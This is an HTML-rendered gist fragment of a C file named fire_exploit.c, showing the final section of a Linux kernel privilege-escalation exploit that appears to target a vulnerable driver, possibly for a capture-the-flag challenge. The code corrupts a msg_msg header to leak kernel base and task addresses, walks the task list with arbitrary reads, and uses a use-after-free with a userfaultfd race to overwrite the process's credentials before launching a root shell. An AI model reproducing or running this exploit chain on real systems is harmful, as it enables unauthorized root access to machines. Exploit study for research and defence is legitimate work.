          <td id="file-fire_exploit-c-LC393" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> ((shmid = <span class="pl-c1">shmget</span>(IPC_PRIVATE, <span class="pl-c1">100</span>, <span class="pl-c1">0600</span>)) == -<span class="pl-c1">1</span>) </td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L394" class="blob-num js-line-number js-code-nav-line-number" data-line-number="394"></td>
          <td id="file-fire_exploit-c-LC394" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L395" class="blob-num js-line-number js-code-nav-line-number" data-line-number="395"></td>
          <td id="file-fire_exploit-c-LC395" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>shmget error<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L396" class="blob-num js-line-number js-code-nav-line-number" data-line-number="396"></td>
          <td id="file-fire_exploit-c-LC396" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L397" class="blob-num js-line-number js-code-nav-line-number" data-line-number="397"></td>
          <td id="file-fire_exploit-c-LC397" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L398" class="blob-num js-line-number js-code-nav-line-number" data-line-number="398"></td>
          <td id="file-fire_exploit-c-LC398" class="blob-code blob-code-inner js-file-line">        shmaddr = <span class="pl-c1">shmat</span>(shmid, <span class="pl-c1">NULL</span>, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L399" class="blob-num js-line-number js-code-nav-line-number" data-line-number="399"></td>
          <td id="file-fire_exploit-c-LC399" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (shmaddr == (<span class="pl-k">void</span>*)-<span class="pl-c1">1</span>) </td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L400" class="blob-num js-line-number js-code-nav-line-number" data-line-number="400"></td>
          <td id="file-fire_exploit-c-LC400" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L401" class="blob-num js-line-number js-code-nav-line-number" data-line-number="401"></td>
          <td id="file-fire_exploit-c-LC401" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">perror</span>(<span class="pl-s"><span class="pl-pds">"</span>shmat error<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L402" class="blob-num js-line-number js-code-nav-line-number" data-line-number="402"></td>
          <td id="file-fire_exploit-c-LC402" class="blob-code blob-code-inner js-file-line">            <span class="pl-c1">exit</span>(-<span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L403" class="blob-num js-line-number js-code-nav-line-number" data-line-number="403"></td>
          <td id="file-fire_exploit-c-LC403" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L404" class="blob-num js-line-number js-code-nav-line-number" data-line-number="404"></td>
          <td id="file-fire_exploit-c-LC404" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L405" class="blob-num js-line-number js-code-nav-line-number" data-line-number="405"></td>
          <td id="file-fire_exploit-c-LC405" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L406" class="blob-num js-line-number js-code-nav-line-number" data-line-number="406"></td>
          <td id="file-fire_exploit-c-LC406" class="blob-code blob-code-inner js-file-line">    msg_header evil;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L407" class="blob-num js-line-number js-code-nav-line-number" data-line-number="407"></td>
          <td id="file-fire_exploit-c-LC407" class="blob-code blob-code-inner js-file-line">    size = <span class="pl-c1">0x1400</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L408" class="blob-num js-line-number js-code-nav-line-number" data-line-number="408"></td>
          <td id="file-fire_exploit-c-LC408" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>((<span class="pl-k">void</span> *)&amp;evil, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(msg_header));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L409" class="blob-num js-line-number js-code-nav-line-number" data-line-number="409"></td>
          <td id="file-fire_exploit-c-LC409" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">ll_next</span> = (<span class="pl-k">void</span> *)<span class="pl-c1">0x4141414141414141</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L410" class="blob-num js-line-number js-code-nav-line-number" data-line-number="410"></td>
          <td id="file-fire_exploit-c-LC410" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">ll_next</span> = (<span class="pl-k">void</span> *)<span class="pl-c1">0x4242424242424242</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L411" class="blob-num js-line-number js-code-nav-line-number" data-line-number="411"></td>
          <td id="file-fire_exploit-c-LC411" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">m_type</span> = <span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L412" class="blob-num js-line-number js-code-nav-line-number" data-line-number="412"></td>
          <td id="file-fire_exploit-c-LC412" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">m_ts</span> = size;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L413" class="blob-num js-line-number js-code-nav-line-number" data-line-number="413"></td>
          <td id="file-fire_exploit-c-LC413" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(buffer, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(buffer));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L414" class="blob-num js-line-number js-code-nav-line-number" data-line-number="414"></td>
          <td id="file-fire_exploit-c-LC414" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>(buffer, (<span class="pl-k">void</span> *)&amp;evil, <span class="pl-c1">0x20</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L415" class="blob-num js-line-number js-code-nav-line-number" data-line-number="415"></td>
          <td id="file-fire_exploit-c-LC415" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">edit</span>(fd, <span class="pl-c1">0</span>, buffer, OUTBOUND, <span class="pl-c1">1</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L416" class="blob-num js-line-number js-code-nav-line-number" data-line-number="416"></td>
          <td id="file-fire_exploit-c-LC416" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L417" class="blob-num js-line-number js-code-nav-line-number" data-line-number="417"></td>
          <td id="file-fire_exploit-c-LC417" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> leak stuff</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L418" class="blob-num js-line-number js-code-nav-line-number" data-line-number="418"></td>
          <td id="file-fire_exploit-c-LC418" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">get_msg</span>(qid, recieved, size, <span class="pl-c1">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L419" class="blob-num js-line-number js-code-nav-line-number" data-line-number="419"></td>
          <td id="file-fire_exploit-c-LC419" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">for</span> (<span class="pl-k">int</span> i = <span class="pl-c1">0</span>; i &lt; size / <span class="pl-c1">8</span>; i++)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L420" class="blob-num js-line-number js-code-nav-line-number" data-line-number="420"></td>
          <td id="file-fire_exploit-c-LC420" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L421" class="blob-num js-line-number js-code-nav-line-number" data-line-number="421"></td>
          <td id="file-fire_exploit-c-LC421" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> ((*(<span class="pl-c1">uint64_t</span> *)(recieved + i * <span class="pl-c1">8</span>) &amp; <span class="pl-c1">0xfff</span>) == <span class="pl-c1">0x7a0</span>)</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L422" class="blob-num js-line-number js-code-nav-line-number" data-line-number="422"></td>
          <td id="file-fire_exploit-c-LC422" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L423" class="blob-num js-line-number js-code-nav-line-number" data-line-number="423"></td>
          <td id="file-fire_exploit-c-LC423" class="blob-code blob-code-inner js-file-line">            init_ipc_ns = *(<span class="pl-c1">uint64_t</span> *)(recieved + i * <span class="pl-c1">8</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L424" class="blob-num js-line-number js-code-nav-line-number" data-line-number="424"></td>
          <td id="file-fire_exploit-c-LC424" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">break</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L425" class="blob-num js-line-number js-code-nav-line-number" data-line-number="425"></td>
          <td id="file-fire_exploit-c-LC425" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L426" class="blob-num js-line-number js-code-nav-line-number" data-line-number="426"></td>
          <td id="file-fire_exploit-c-LC426" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L427" class="blob-num js-line-number js-code-nav-line-number" data-line-number="427"></td>
          <td id="file-fire_exploit-c-LC427" class="blob-code blob-code-inner js-file-line">    kbase = init_ipc_ns - (<span class="pl-c1">0xffffffff81c3d7a0</span> - <span class="pl-c1">0xffffffff81000000</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L428" class="blob-num js-line-number js-code-nav-line-number" data-line-number="428"></td>
          <td id="file-fire_exploit-c-LC428" class="blob-code blob-code-inner js-file-line">    init_task = kbase + (<span class="pl-c1">0xffffffff81c124c0</span> - <span class="pl-c1">0xffffffff81000000</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L429" class="blob-num js-line-number js-code-nav-line-number" data-line-number="429"></td>
          <td id="file-fire_exploit-c-LC429" class="blob-code blob-code-inner js-file-line">    init_cred = kbase + (<span class="pl-c1">0xffffffff81c33060</span> - <span class="pl-c1">0xffffffff81000000</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L430" class="blob-num js-line-number js-code-nav-line-number" data-line-number="430"></td>
          <td id="file-fire_exploit-c-LC430" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>[+] init_ipc_ns: 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, init_ipc_ns);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L431" class="blob-num js-line-number js-code-nav-line-number" data-line-number="431"></td>
          <td id="file-fire_exploit-c-LC431" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>[+] kbase: 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, kbase);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L432" class="blob-num js-line-number js-code-nav-line-number" data-line-number="432"></td>
          <td id="file-fire_exploit-c-LC432" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>[+] init_task: 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, init_task);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L433" class="blob-num js-line-number js-code-nav-line-number" data-line-number="433"></td>
          <td id="file-fire_exploit-c-LC433" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>[+] init_cred: 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, init_cred);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L434" class="blob-num js-line-number js-code-nav-line-number" data-line-number="434"></td>
          <td id="file-fire_exploit-c-LC434" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L435" class="blob-num js-line-number js-code-nav-line-number" data-line-number="435"></td>
          <td id="file-fire_exploit-c-LC435" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> offset is 0x298 for tasks dll, walk back via arb read because most recent task, faster to hit</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L436" class="blob-num js-line-number js-code-nav-line-number" data-line-number="436"></td>
          <td id="file-fire_exploit-c-LC436" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> pid should be at 0x398</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L437" class="blob-num js-line-number js-code-nav-line-number" data-line-number="437"></td>
          <td id="file-fire_exploit-c-LC437" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>((<span class="pl-k">void</span> *)&amp;evil, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(msg_header));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L438" class="blob-num js-line-number js-code-nav-line-number" data-line-number="438"></td>
          <td id="file-fire_exploit-c-LC438" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(recieved, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(recieved));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L439" class="blob-num js-line-number js-code-nav-line-number" data-line-number="439"></td>
          <td id="file-fire_exploit-c-LC439" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(buffer, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(buffer));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L440" class="blob-num js-line-number js-code-nav-line-number" data-line-number="440"></td>
          <td id="file-fire_exploit-c-LC440" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">m_type</span> = <span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L441" class="blob-num js-line-number js-code-nav-line-number" data-line-number="441"></td>
          <td id="file-fire_exploit-c-LC441" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">m_ts</span> = size;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L442" class="blob-num js-line-number js-code-nav-line-number" data-line-number="442"></td>
          <td id="file-fire_exploit-c-LC442" class="blob-code blob-code-inner js-file-line">    evil.<span class="pl-smi">next</span> = (<span class="pl-k">void</span> *)init_task + <span class="pl-c1">0x298</span> - <span class="pl-c1">0x8</span>; <span class="pl-c"><span class="pl-c">//</span> one null qword beforehand to avoid crash</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L443" class="blob-num js-line-number js-code-nav-line-number" data-line-number="443"></td>
          <td id="file-fire_exploit-c-LC443" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>(buffer, (<span class="pl-k">void</span> *)&amp;evil, <span class="pl-k">sizeof</span>(msg_header));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L444" class="blob-num js-line-number js-code-nav-line-number" data-line-number="444"></td>
          <td id="file-fire_exploit-c-LC444" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">edit</span>(fd, <span class="pl-c1">0</span>, buffer, OUTBOUND, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L445" class="blob-num js-line-number js-code-nav-line-number" data-line-number="445"></td>
          <td id="file-fire_exploit-c-LC445" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">get_msg</span>(qid, recieved, size, <span class="pl-c1">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L446" class="blob-num js-line-number js-code-nav-line-number" data-line-number="446"></td>
          <td id="file-fire_exploit-c-LC446" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L447" class="blob-num js-line-number js-code-nav-line-number" data-line-number="447"></td>
          <td id="file-fire_exploit-c-LC447" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">int32_t</span> pid;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L448" class="blob-num js-line-number js-code-nav-line-number" data-line-number="448"></td>
          <td id="file-fire_exploit-c-LC448" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">uint64_t</span> prev, curr;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L449" class="blob-num js-line-number js-code-nav-line-number" data-line-number="449"></td>
          <td id="file-fire_exploit-c-LC449" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span>*)&amp;prev, (<span class="pl-k">void</span> *)(recieved + <span class="pl-c1">0xfe0</span>), <span class="pl-c1">8</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L450" class="blob-num js-line-number js-code-nav-line-number" data-line-number="450"></td>
          <td id="file-fire_exploit-c-LC450" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span>*)&amp;pid, (<span class="pl-k">void</span> *)(recieved + <span class="pl-c1">0x10d8</span>), <span class="pl-c1">4</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L451" class="blob-num js-line-number js-code-nav-line-number" data-line-number="451"></td>
          <td id="file-fire_exploit-c-LC451" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span><span class="pl-c1">%d</span> <span class="pl-c1">%d</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, pid, <span class="pl-c1">getpid</span>());</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L452" class="blob-num js-line-number js-code-nav-line-number" data-line-number="452"></td>
          <td id="file-fire_exploit-c-LC452" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L453" class="blob-num js-line-number js-code-nav-line-number" data-line-number="453"></td>
          <td id="file-fire_exploit-c-LC453" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">while</span> (pid != <span class="pl-c1">getpid</span>())</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L454" class="blob-num js-line-number js-code-nav-line-number" data-line-number="454"></td>
          <td id="file-fire_exploit-c-LC454" class="blob-code blob-code-inner js-file-line">    {</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L455" class="blob-num js-line-number js-code-nav-line-number" data-line-number="455"></td>
          <td id="file-fire_exploit-c-LC455" class="blob-code blob-code-inner js-file-line">        curr = prev - <span class="pl-c1">0x298</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L456" class="blob-num js-line-number js-code-nav-line-number" data-line-number="456"></td>
          <td id="file-fire_exploit-c-LC456" class="blob-code blob-code-inner js-file-line">        evil.<span class="pl-smi">next</span> = (<span class="pl-k">void</span> *)prev - <span class="pl-c1">0x8</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L457" class="blob-num js-line-number js-code-nav-line-number" data-line-number="457"></td>
          <td id="file-fire_exploit-c-LC457" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memcpy</span>(buffer, (<span class="pl-k">void</span> *)&amp;evil, <span class="pl-k">sizeof</span>(msg_header));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L458" class="blob-num js-line-number js-code-nav-line-number" data-line-number="458"></td>
          <td id="file-fire_exploit-c-LC458" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">edit</span>(fd, <span class="pl-c1">0</span>, buffer, OUTBOUND, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L459" class="blob-num js-line-number js-code-nav-line-number" data-line-number="459"></td>
          <td id="file-fire_exploit-c-LC459" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">get_msg</span>(qid, recieved, size, <span class="pl-c1">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L460" class="blob-num js-line-number js-code-nav-line-number" data-line-number="460"></td>
          <td id="file-fire_exploit-c-LC460" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span>*)&amp;prev, (<span class="pl-k">void</span> *)(recieved + <span class="pl-c1">0xfe0</span>), <span class="pl-c1">8</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L461" class="blob-num js-line-number js-code-nav-line-number" data-line-number="461"></td>
          <td id="file-fire_exploit-c-LC461" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">memcpy</span>((<span class="pl-k">void</span>*)&amp;pid, (<span class="pl-k">void</span> *)(recieved + <span class="pl-c1">0x10d8</span>), <span class="pl-c1">4</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L462" class="blob-num js-line-number js-code-nav-line-number" data-line-number="462"></td>
          <td id="file-fire_exploit-c-LC462" class="blob-code blob-code-inner js-file-line">        <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span><span class="pl-c1">%d</span> <span class="pl-c1">%d</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, pid, <span class="pl-c1">getpid</span>());</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L463" class="blob-num js-line-number js-code-nav-line-number" data-line-number="463"></td>
          <td id="file-fire_exploit-c-LC463" class="blob-code blob-code-inner js-file-line">    }</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L464" class="blob-num js-line-number js-code-nav-line-number" data-line-number="464"></td>
          <td id="file-fire_exploit-c-LC464" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L465" class="blob-num js-line-number js-code-nav-line-number" data-line-number="465"></td>
          <td id="file-fire_exploit-c-LC465" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>[+] found current task struct: 0x<span class="pl-c1">%llx</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, curr);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L466" class="blob-num js-line-number js-code-nav-line-number" data-line-number="466"></td>
          <td id="file-fire_exploit-c-LC466" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L467" class="blob-num js-line-number js-code-nav-line-number" data-line-number="467"></td>
          <td id="file-fire_exploit-c-LC467" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> UAF for arb write</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L468" class="blob-num js-line-number js-code-nav-line-number" data-line-number="468"></td>
          <td id="file-fire_exploit-c-LC468" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">add</span>(fd, <span class="pl-c1">1</span>, buffer, INBOUND);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L469" class="blob-num js-line-number js-code-nav-line-number" data-line-number="469"></td>
          <td id="file-fire_exploit-c-LC469" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">duplicate</span>(fd, <span class="pl-c1">1</span>, INBOUND);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L470" class="blob-num js-line-number js-code-nav-line-number" data-line-number="470"></td>
          <td id="file-fire_exploit-c-LC470" class="blob-code blob-code-inner js-file-line">    delete(fd, <span class="pl-c1">1</span>, INBOUND);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L471" class="blob-num js-line-number js-code-nav-line-number" data-line-number="471"></td>
          <td id="file-fire_exploit-c-LC471" class="blob-code blob-code-inner js-file-line">    <span class="pl-c"><span class="pl-c">//</span> real_cred and cred is at 0x538 and 0x540</span></td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L472" class="blob-num js-line-number js-code-nav-line-number" data-line-number="472"></td>
          <td id="file-fire_exploit-c-LC472" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">memset</span>(buffer, <span class="pl-c1">0</span>, <span class="pl-k">sizeof</span>(buffer));</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L473" class="blob-num js-line-number js-code-nav-line-number" data-line-number="473"></td>
          <td id="file-fire_exploit-c-LC473" class="blob-code blob-code-inner js-file-line">    msg *rooter;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L474" class="blob-num js-line-number js-code-nav-line-number" data-line-number="474"></td>
          <td id="file-fire_exploit-c-LC474" class="blob-code blob-code-inner js-file-line">    <span class="pl-k">void</span> *evil_page = <span class="pl-c1">mmap</span>((<span class="pl-k">void</span> *)<span class="pl-c1">0x1337000</span>, <span class="pl-c1">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, <span class="pl-c1">0</span>, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L475" class="blob-num js-line-number js-code-nav-line-number" data-line-number="475"></td>
          <td id="file-fire_exploit-c-LC475" class="blob-code blob-code-inner js-file-line">    race_page = <span class="pl-c1">0x1338000</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L476" class="blob-num js-line-number js-code-nav-line-number" data-line-number="476"></td>
          <td id="file-fire_exploit-c-LC476" class="blob-code blob-code-inner js-file-line">    rooter = (msg *)(race_page-<span class="pl-c1">0x8</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L477" class="blob-num js-line-number js-code-nav-line-number" data-line-number="477"></td>
          <td id="file-fire_exploit-c-LC477" class="blob-code blob-code-inner js-file-line">    rooter-&gt;<span class="pl-smi">mtype</span> = <span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L478" class="blob-num js-line-number js-code-nav-line-number" data-line-number="478"></td>
          <td id="file-fire_exploit-c-LC478" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L479" class="blob-num js-line-number js-code-nav-line-number" data-line-number="479"></td>
          <td id="file-fire_exploit-c-LC479" class="blob-code blob-code-inner js-file-line">    size = <span class="pl-c1">0x1010</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L480" class="blob-num js-line-number js-code-nav-line-number" data-line-number="480"></td>
          <td id="file-fire_exploit-c-LC480" class="blob-code blob-code-inner js-file-line">    target_idx = <span class="pl-c1">1</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L481" class="blob-num js-line-number js-code-nav-line-number" data-line-number="481"></td>
          <td id="file-fire_exploit-c-LC481" class="blob-code blob-code-inner js-file-line">    target_addr = curr + <span class="pl-c1">0x538</span> - <span class="pl-c1">0x8</span>;</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L482" class="blob-num js-line-number js-code-nav-line-number" data-line-number="482"></td>
          <td id="file-fire_exploit-c-LC482" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L483" class="blob-num js-line-number js-code-nav-line-number" data-line-number="483"></td>
          <td id="file-fire_exploit-c-LC483" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">register_userfault</span>(race_page, thread, arb_write);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L484" class="blob-num js-line-number js-code-nav-line-number" data-line-number="484"></td>
          <td id="file-fire_exploit-c-LC484" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">send_msg</span>(qid, rooter, size - <span class="pl-c1">0x30</span>, <span class="pl-c1">0</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L485" class="blob-num js-line-number js-code-nav-line-number" data-line-number="485"></td>
          <td id="file-fire_exploit-c-LC485" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">pthread_join</span>(thread, <span class="pl-c1">NULL</span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L486" class="blob-num js-line-number js-code-nav-line-number" data-line-number="486"></td>
          <td id="file-fire_exploit-c-LC486" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L487" class="blob-num js-line-number js-code-nav-line-number" data-line-number="487"></td>
          <td id="file-fire_exploit-c-LC487" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">printf</span>(<span class="pl-s"><span class="pl-pds">"</span>uid: <span class="pl-c1">%d</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>, <span class="pl-c1">getuid</span>());</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L488" class="blob-num js-line-number js-code-nav-line-number" data-line-number="488"></td>
          <td id="file-fire_exploit-c-LC488" class="blob-code blob-code-inner js-file-line">    <span class="pl-c1">system</span>(<span class="pl-s"><span class="pl-pds">"</span>/bin/sh<span class="pl-pds">"</span></span>);</td>
        </tr>
        <tr>
          <td id="file-fire_exploit-c-L489" class="blob-num js-line-number js-code-nav-line-number" data-line-number="489"></td>
          <td id="file-fire_exploit-c-LC489" class="blob-code blob-code-inner js-file-line">}</td>
        </tr>
  </tbody></table>
</div>


  </div>

  </div>
</div>

      </div>
      <div class="gist-meta">
